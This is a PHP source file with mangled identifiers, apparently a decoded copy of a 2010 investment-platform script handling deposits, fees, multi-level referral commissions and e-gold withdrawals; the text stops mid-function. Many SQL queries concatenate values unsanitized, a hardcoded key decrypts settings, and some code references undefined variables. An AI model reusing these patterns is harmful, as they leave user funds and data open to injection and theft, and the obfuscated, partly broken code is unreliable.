<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlcmnsv ($elnlcbrWGr)
  {
    $elnlcLDgi = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlcbrWGr, $elnlcLDgi))
    {
      $elnlcbrWGr = $elnlcLDgi[1];
    }

    return $elnlcbrWGr;
  }

  function elnlcooor ($elnlcbrWGr, $elnlcboRn, $d)
  {
    global $elnlchyuw;
    $elnlcpSub = ($elnlcbrWGr + 48273) % $elnlcboRn;
    $elnlcElGQ = $elnlchyuw['elnlcRjwtU'];
    $elnlcaqkKW = $elnlcpSub;
    while ($elnlcElGQ == 0)
    {
      if ($d[$elnlcpSub] != -1)
      {
        ++$elnlcpSub;
        if ($elnlcpSub == $elnlcboRn)
        {
          $elnlcpSub = $elnlchyuw['elnlcRjwtU'];
          continue;
        }

        continue;
      }

      $elnlcElGQ = $elnlchyuw['elnlchcRPc'];
    }

    return $elnlcpSub;
  }

  function elnlceuglx ($elnlcbrWGr, $elnlcboRn, $d)
  {
    global $elnlchyuw;
    $elnlcpSub = ($elnlcbrWGr + 48273) % $elnlcboRn;
    $elnlcElGQ = $elnlchyuw['elnlcRjwtU'];
    while (!$elnlcElGQ)
    {
      if ($d[$elnlcpSub] == -1)
      {
        ++$elnlcpSub;
        if ($elnlcpSub == $elnlcboRn)
        {
          $elnlcpSub = $elnlchyuw['elnlcRjwtU'];
          continue;
        }

        continue;
      }

      $elnlcElGQ = $elnlchyuw['elnlchcRPc'];
    }

    return $elnlcpSub;
  }

  function elnlcvatm ()
  {
    global $elnlchyuw;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcVWtlw;
    global $elnlcTcyic;
    $q = 'select * from hm2_users where id = 1';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    $elnlcSAUD = array ();
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcSAUD = array ();
      $z = elnlctikpg ($elnlcgVDB[$elnlchyuw['elnlcPJUb']], '&hd,mnf(fska$d3jlkfsda' . $elnlcTcyic[$elnlchyuw['elnlcHPIo']]);
      $elnlcSAUD = unserialize ($z);
    }

    return $elnlcSAUD;
  }

  function elnlcsfjv ()
  {
    global $elnlchyuw;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcVWtlw;
    global $elnlcaDcEj;
    global $elnlcTcyic;
    $z = elnlcekjci (elnlcpqrdz (serialize ($elnlcaDcEj), '&hd,mnf(fska$d3jlkfsda' . $elnlcTcyic[$elnlchyuw['elnlcHPIo']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlcfevr ($elnlcNUxqQ, $elnlcJCGAH, $elnlcLiht, $elnlcdiuI, $elnlcqdjux, $elnlcHHcr, $elnlcyHTK)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    global $elnlcbzJNF;
    $elnlcyHTK = intval ($elnlcyHTK);
    $elnlcHHcr = intval ($elnlcHHcr);
    $elnlcJCGAH = intval ($elnlcJCGAH);
    $elnlcLiht = sprintf ('%.02f', $elnlcLiht);
    $elnlcWmIP = elnlcekjci ($elnlcdiuI);
    $elnlcxobfj = $elnlchyuw['elnlcRjwtU'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlcNUxqQ . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcWmIP . '\'';
    $elnlcTpvVW = mysql_query ($q);
    $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
    if (0 < $elnlcgVDB[$elnlchyuw['elnlcQftKW']])
    {
      $elnlcxobfj = $elnlchyuw['elnlchcRPc'];
    }

    if ($elnlcxobfj == 1)
    {
      return 0;
    }

    $elnlcOiMh = 'Add funds to account from ' . $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']] . ('' . '. Batch id = ' . $elnlcdiuI);
    if (($elnlcNUxqQ == 4 AND $elnlcTcyic[$elnlchyuw['elnlcAcpUG']] == 1))
    {
      $elnlcOiMh = 'Add funds to account from ' . $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']] . ('' . ' ' . $elnlcLiht . ' - StormPay Fee. Batch id = ' . $elnlcdiuI);
      $elnlcLiht = $elnlcLiht - $elnlcLiht * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlcNUxqQ == 4 AND $elnlcTcyic[$elnlchyuw['elnlcfric']] == 1))
      {
        $elnlcOiMh = 'Add funds to account from ' . $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']] . ('' . ' ' . $elnlcLiht . ' - StormPay Fee. Batch id = ' . $elnlcdiuI);
        $elnlcLiht = $elnlcLiht - $elnlcLiht * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcTcyic[$elnlchyuw['elnlcBeRxm']])
    {
      $elnlcwlDFL = sprintf ('%0.2', $elnlcLiht * $elnlcTcyic[$elnlchyuw['elnlcBeRxm']] / 100);
      if ($elnlcwlDFL < $elnlcTcyic[$elnlchyuw['elnlcBHpo']])
      {
        $elnlcwlDFL = $elnlcTcyic[$elnlchyuw['elnlcBHpo']];
      }

      $elnlcLiht = $elnlcLiht - $elnlcwlDFL;
      $elnlcOiMh .= '' . '. Deposit fee - ' . $elnlcwlDFL;
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'])
    {
      $elnlcNUxqQ = $elnlchyuw['elnlciGwA'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcJCGAH . ',
        	amount = \'' . $elnlcLiht . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlcOiMh . '\',
        	actual_amount = ' . $elnlcLiht . ',
        	ec = ' . $elnlcNUxqQ . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcHHcr;
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    $elnlcedeAj = '';
    $elnlcQRzmN = mysql_fetch_array ($elnlcTpvVW);
    $elnlcshdug = -1;
    if ($elnlcQRzmN)
    {
      $elnlcshdug += $elnlcgVDB[$elnlchyuw['elnlcnhppU']];
      $elnlcedeAj = elnlcekjci ($elnlcQRzmN[$elnlchyuw['elnlcvbiD']]);
      if ($elnlcQRzmN[$elnlchyuw['elnlcFhrHQ']] == 0)
      {
        $elnlcyHTK = $elnlchyuw['elnlcRjwtU'];
      }
      else
      {
        if ($elnlcQRzmN[$elnlchyuw['elnlcsWIGP']] == 0)
        {
          $elnlcQRzmN[$elnlchyuw['elnlcsWIGP']] = $elnlcLiht + 1;
        }

        if (($elnlcQRzmN[$elnlchyuw['elnlcNsiAD']] <= $elnlcLiht AND $elnlcLiht <= $elnlcQRzmN[$elnlchyuw['elnlcsWIGP']]))
        {
          if ($elnlcQRzmN[$elnlchyuw['elnlcQSjJt']] == 1)
          {
            $elnlcpqAJt = preg_split ('/\\s*,\\s*/', $elnlcQRzmN[$elnlchyuw['elnlclUSEx']]);
            if (!in_array ($elnlcyHTK, $elnlcpqAJt))
            {
              $elnlcyHTK = $elnlcpqAJt[0];
            }
          }
          else
          {
            if ($elnlcyHTK < $elnlcQRzmN[$elnlchyuw['elnlcWDayO']])
            {
              $elnlcyHTK = $elnlcQRzmN[$elnlchyuw['elnlcWDayO']];
            }

            if ($elnlcQRzmN[$elnlchyuw['elnlclTMy']] < $elnlcyHTK)
            {
              $elnlcyHTK = $elnlcQRzmN[$elnlchyuw['elnlclTMy']];
            }
          }
        }
        else
        {
          $elnlcyHTK = $elnlchyuw['elnlcRjwtU'];
        }
      }
    }

    if ($elnlcshdug < 0)
    {
      $elnlcshdug = $elnlchyuw['elnlcRjwtU'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcHHcr;
    $elnlcGvCo = mysql_query ($q);
    $elnlcIHmju = mysql_fetch_array ($elnlcGvCo);
    $elnlcBema = $elnlcIHmju[$elnlchyuw['elnlcpMTS']];
    $elnlciaSmB = $elnlcIHmju[$elnlchyuw['elnlcSpto']];
    if (($elnlcBema <= $elnlcLiht AND $elnlcLiht <= $elnlciaSmB))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcJCGAH . ',
          	type_id = ' . $elnlcHHcr . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlcshdug . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcLiht . '\',
          	actual_amount = \'' . $elnlcLiht . '\',
          	ec = ' . $elnlcNUxqQ . ',
          	compound = ' . $elnlcyHTK . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcphuj = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcJCGAH . ',
          	amount = \'-' . $elnlcLiht . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlcekjci ($elnlcedeAj) . ('' . '\',
          	actual_amount = -' . $elnlcLiht . ',
          	ec = ' . $elnlcNUxqQ . ',
          	date = now(),
                deposit_id = ' . $elnlcphuj . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcMOqf'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcMOQN[$elnlchyuw['elnlclRBWS']];
        mysql_query ($q);
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcIyUQ'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcJCGAH;
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlcsUQw = $elnlchyuw['elnlcRjwtU'];
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcsUQw = $elnlcgVDB[$elnlchyuw['elnlchGQKt']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlcrfqge = $elnlchyuw['elnlcIcsrz'];
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcrfqge = $elnlcgVDB[$elnlchyuw['elnlchGQKt']];
        }

        if (($elnlcsUQw == 1 AND $elnlcrfqge <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcJCGAH . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlcNUxqQ . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcRwNG']] == 1)
      {
        $elnlchjoOI = $elnlchyuw['elnlcRjwtU'];
        if (0 < $elnlcTcyic[$elnlchyuw['elnlculme']])
        {
          $elnlchjoOI = $elnlcLiht * 1000 / $elnlcTcyic[$elnlchyuw['elnlculme']];
        }

        if (0 < $elnlchjoOI)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlchjoOI . ' where id = ' . $elnlcJCGAH;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlcmNnO = elnlcicar ($elnlcJCGAH, $elnlcLiht, $elnlcNUxqQ);
    }
    else
    {
      $elnlcedeAj = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcJCGAH;
    $elnlcTpvVW = mysql_query ($q);
    $elnlcmiFKI = mysql_fetch_array ($elnlcTpvVW);
    $elnlcfOud = array ($elnlcmiFKI);
    $elnlcfOud[$elnlchyuw['elnlcEzHQ']] = $elnlcmiFKI[$elnlchyuw['elnlcEzHQ']];
    $elnlcfOud[$elnlchyuw['elnlcvbiD']] = $elnlcmiFKI[$elnlchyuw['elnlcvbiD']];
    $elnlcfOud[$elnlchyuw['elnlcGsrCm']] = number_format ($elnlcLiht, 2);
    $elnlcfOud[$elnlchyuw['elnlcVmHJ']] = $elnlcqdjux;
    $elnlcfOud[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']];
    $elnlcfOud[$elnlchyuw['elnlcDPJw']] = $elnlcdiuI;
    $elnlcfOud[$elnlchyuw['elnlcStyIm']] = $elnlcyHTK;
    $elnlcfOud[$elnlchyuw['elnlcxrGyF']] = elnlcmnsv ($elnlcedeAj);
    $elnlcfOud[$elnlchyuw['elnlcFrsO']] = $elnlcmNnO;
    $elnlcfOud[$elnlchyuw['elnlcpaBSP']] = '[no upline]';
    if (0 < $elnlcmiFKI[$elnlchyuw['elnlcMaAHi']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcmiFKI[$elnlchyuw['elnlcMaAHi']];
      ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
      while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
      {
        $elnlcfOud[$elnlchyuw['elnlcpaBSP']] = $elnlcgVDB[$elnlchyuw['elnlcEzHQ']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlcTpvVW = mysql_query ($q);
    $elnlcgWRy = '';
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcgWRy = $elnlcgVDB[$elnlchyuw['elnlcOnCG']];
    }

    elnlcqkpc ('deposit_admin_notification', $elnlcgWRy, $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcfOud);
    elnlcqkpc ('deposit_user_notification', $elnlcmiFKI[email], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcfOud);
    return 1;
  }

  function elnlcicar ($elnlcJCGAH, $elnlcLiht, $elnlcNUxqQ)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    global $elnlcbzJNF;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcJCGAH;
    $elnlcppJRe = mysql_query ($q);
    $elnlctjuM = mysql_fetch_array ($elnlcppJRe);
    if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'])
    {
      $elnlcaAse = $elnlcotqT[$elnlchyuw['elnlcMaAHi']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcaAse;
      $elnlcTpvVW = mysql_query ($q);
      $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
      if ($elnlcgVDB[$elnlchyuw['elnlcQftKW']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcaAse;
      $elnlcTpvVW = mysql_query ($q);
      $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
      if ($elnlcgVDB[$elnlchyuw['elnlcCVBAG']] < 3000)
      {
        $elnlcjtAF = $elnlchyuw['elnlcRjwtU'];
        return 0;
      }
      else
      {
        if ($elnlcgVDB[$elnlchyuw['elnlcCVBAG']] < 6000)
        {
          $elnlcjtAF = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlcgVDB[$elnlchyuw['elnlcCVBAG']] < 12000)
          {
            $elnlcjtAF = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcjtAF = 0.100000000000000005551115;
          }
        }
      }

      $elnlcozOn = $elnlcLiht * $elnlcjtAF;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcaAse . ',
      	amount = ' . $elnlcozOn . ',
      	actual_amount = ' . $elnlcozOn . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlcekjci ($elnlctjuM[$elnlchyuw['elnlcEzHQ']]) . ('' . '\',
      	ec = ' . $elnlcNUxqQ . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcaAse;
      $elnlcppJRe = mysql_query ($q);
      $elnlcqAKd = mysql_fetch_array ($elnlcppJRe);
      $elnlcqAKd[$elnlchyuw['elnlcGsrCm']] = number_format ($elnlcozOn, 2);
      $elnlcqAKd[$elnlchyuw['elnlcoPuhH']] = $elnlctjuM[$elnlchyuw['elnlcEzHQ']];
      $elnlcqAKd[$elnlchyuw['elnlcKhRoW']] = $elnlctjuM[$elnlchyuw['elnlcvbiD']];
      $elnlcqAKd[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']];
      elnlcqkpc ('referral_commision_notification', $elnlcqAKd[$elnlchyuw['elnlcOnCG']], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcqAKd);
    }

    $elnlcmNnO = $elnlchyuw['elnlcRjwtU'];
    if ($elnlcTcyic[$elnlchyuw['elnlccTOt']] == 1)
    {
      $elnlcaAse = $elnlchyuw['elnlcRjwtU'];
      if (0 < $elnlctjuM[$elnlchyuw['elnlcMaAHi']])
      {
        $elnlcaAse = $elnlctjuM[$elnlchyuw['elnlcMaAHi']];
      }
      else
      {
        return 0;
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcOSIeu']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcaAse;
        $elnlcTpvVW = mysql_query ($q);
        $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
        if ($elnlcgVDB[$elnlchyuw['elnlcQftKW']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcTcyic[$elnlchyuw['elnlcViSF']] AND $elnlcLiht < $elnlcTcyic[$elnlchyuw['elnlcViSF']]))
      {
        return 0;
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcfSAL']] == 1)
      {
        if (0 < $elnlcTcyic[$elnlchyuw['elnlcEkii']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcJCGAH;
          $elnlcTpvVW = mysql_query ($q);
          $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
          if ($elnlcgVDB[$elnlchyuw['elnlcQftKW']] == 1)
          {
            $elnlcozOn = $elnlcTcyic[$elnlchyuw['elnlcEkii']];
            $elnlcmNnO += $elnlcozOn;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcaAse . ',
    		amount = ' . $elnlcozOn . ',
    		actual_amount = ' . $elnlcozOn . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcekjci ($elnlctjuM[$elnlchyuw['elnlcEzHQ']]) . ('' . '\',
    		ec = ' . $elnlcNUxqQ . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcaAse;
            $elnlcppJRe = mysql_query ($q);
            $elnlcqAKd = mysql_fetch_array ($elnlcppJRe);
            $elnlcqAKd[$elnlchyuw['elnlcGsrCm']] = number_format ($elnlcozOn, 2);
            $elnlcqAKd[$elnlchyuw['elnlcoPuhH']] = $elnlctjuM[$elnlchyuw['elnlcEzHQ']];
            $elnlcqAKd[$elnlchyuw['elnlcKhRoW']] = $elnlctjuM[$elnlchyuw['elnlcvbiD']];
            $elnlcqAKd[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']];
            elnlcqkpc ('referral_commision_notification', $elnlcqAKd[$elnlchyuw['elnlcOnCG']], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcqAKd);
          }
        }
      }
      else
      {
        if ($elnlcTcyic[$elnlchyuw['elnlcxjVv']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcaAse . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcaAse;
        }

        $elnlcTpvVW = mysql_query ($q);
        if ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlceTaQb = $elnlcgVDB[$elnlchyuw['elnlchGQKt']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcaAse;
          $elnlcppJRe = mysql_query ($q);
          $elnlcftJH = mysql_fetch_array ($elnlcppJRe);
          $elnlcpLGu = @unserialize ($elnlcftJH[$elnlchyuw['elnlcoQnn']]);
          if (isset ($elnlcpLGu[$elnlchyuw['elnlcJsCB']]))
          {
            $j = $elnlchyuw['elnlchcRPc'];
            while (isset ($elnlcpLGu['ref_percent' . $j]))
            {
              if (($elnlcpLGu['ref_percent' . $j][0] <= $elnlceTaQb AND $elnlceTaQb <= $elnlcpLGu['ref_percent' . $j][1]))
              {
                $elnlcozOn = $elnlcLiht * $elnlcpLGu['ref_percent' . $j][2] / 100;
                $elnlcmNnO += $elnlcozOn;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcpEqvm'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcaAse;
              $elnlcTpvVW = mysql_query ($q);
              $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
              $elnlcjtAF = $elnlchyuw['elnlcRjwtU'];
              if (10000 <= $elnlcgVDB[$elnlchyuw['elnlcCVBAG']])
              {
                $elnlcjtAF = $elnlchyuw['elnlchOiOc'];
              }
              else
              {
                if (5000 <= $elnlcgVDB[$elnlchyuw['elnlcCVBAG']])
                {
                  $elnlcjtAF = $elnlchyuw['elnlcEEkT'];
                }
                else
                {
                  if (3000 <= $elnlcgVDB[$elnlchyuw['elnlcCVBAG']])
                  {
                    $elnlcjtAF = $elnlchyuw['elnlcprqks'];
                  }
                  else
                  {
                    if (1000 <= $elnlcgVDB[$elnlchyuw['elnlcCVBAG']])
                    {
                      $elnlcjtAF = $elnlchyuw['elnlcFcEQ'];
                    }
                  }
                }
              }

              if (0 < $elnlcjtAF)
              {
                if (4 <= $elnlceTaQb)
                {
                  $elnlcjtAF += 3;
                }

                $elnlcozOn = $elnlcLiht * $elnlcjtAF / 100;
                $elnlcmNnO += $elnlcozOn;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcaAse . ',
    		amount = ' . $elnlcozOn . ',
    		actual_amount = ' . $elnlcozOn . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcekjci ($elnlctjuM[$elnlchyuw['elnlcEzHQ']]) . ('' . '\',
    		ec = ' . $elnlcNUxqQ . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlceTaQb . ' and (to_value >= ' . $elnlceTaQb . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
              if ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
              {
                $elnlcozOn = $elnlcLiht * $elnlcgVDB[$elnlchyuw['elnlchJOG']] / 100;
                $elnlcmNnO += $elnlcozOn;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcaAse . ',
    		amount = ' . $elnlcozOn . ',
    		actual_amount = ' . $elnlcozOn . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcekjci ($elnlctjuM[$elnlchyuw['elnlcEzHQ']]) . ('' . '\',
    		ec = ' . $elnlcNUxqQ . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcaAse;
          $elnlcppJRe = mysql_query ($q);
          $elnlcqAKd = mysql_fetch_array ($elnlcppJRe);
          $elnlcqAKd[$elnlchyuw['elnlcGsrCm']] = number_format ($elnlcozOn, 2);
          $elnlcqAKd[$elnlchyuw['elnlcoPuhH']] = $elnlctjuM[$elnlchyuw['elnlcEzHQ']];
          $elnlcqAKd[$elnlchyuw['elnlcKhRoW']] = $elnlctjuM[$elnlchyuw['elnlcvbiD']];
          $elnlcqAKd[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[$elnlcNUxqQ][$elnlchyuw['elnlcvbiD']];
          elnlcqkpc ('referral_commision_notification', $elnlcqAKd[$elnlchyuw['elnlcOnCG']], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcqAKd);
        }
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcfSAL']] != 1)
      {
        for ($i = $elnlchyuw['elnlcIkxh']; $i < 11; ++$i)
        {
          if (($elnlcaAse == 0 OR $elnlcTcyic['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcTcyic['ref' . $i . '_cms_minamount'] AND $elnlcLiht < $elnlcTcyic['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcaAse;
          $elnlcTpvVW = mysql_query ($q);
          $elnlcaAse = $elnlchyuw['elnlcRjwtU'];
          while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
          {
            $elnlcaAse = $elnlcgVDB[$elnlchyuw['elnlcMaAHi']];
            if (0 < $elnlcaAse)
            {
              $elnlcnAAP = $elnlchyuw['elnlchcRPc'];
              if ($elnlcTcyic[$elnlchyuw['elnlcOSIeu']] == 1)
              {
                $elnlcnAAP = $elnlchyuw['elnlcRjwtU'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcaAse;
                $elnlcunDlz = mysql_query ($q);
                $elnlccFsKm = mysql_fetch_array ($elnlcunDlz);
                if (0 < $elnlccFsKm[$elnlchyuw['elnlcQftKW']])
                {
                  $elnlcnAAP = $elnlchyuw['elnlchcRPc'];
                }
              }

              if ($elnlcnAAP == 1)
              {
                $elnlcozOn = $elnlcLiht * $elnlcTcyic['ref' . $i . '_cms'] / 100;
                $elnlcmNnO += $elnlcozOn;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlcgVDB[$elnlchyuw['elnlcMaAHi']] . ('' . ',
                  amount = ' . $elnlcozOn . ',
                  actual_amount = ' . $elnlcozOn . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlcekjci ($elnlctjuM[$elnlchyuw['elnlcEzHQ']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlcNUxqQ . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlcmNnO;
  }

  function elnlcfeahv ($elnlcqdjux, $elnlcNUxqQ)
  {
    global $elnlchyuw;
    global $elnlcbzJNF;
    $elnlcNUxqQ = intval ($elnlcNUxqQ);
    $elnlcqdjux = elnlcekjci ($elnlcqdjux);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlcNUxqQ . '=' . $elnlcqdjux . '\'';
    $elnlcTpvVW = mysql_query ($q);
    $elnlcgVDB = mysql_fetch_assoc ($elnlcTpvVW);
    if (0 < $elnlcgVDB[$elnlchyuw['elnlcQftKW']])
    {
      return array (0, 'Blacklisted ' . $elnlcbzJNF[$elnlcNUxqQ] . ' account ' . $elnlcqdjux);
    }

    return array (1, '');
  }

  function elnlcltil ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 0);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcqajx = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcqajx = $elnlcFFkqn;
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
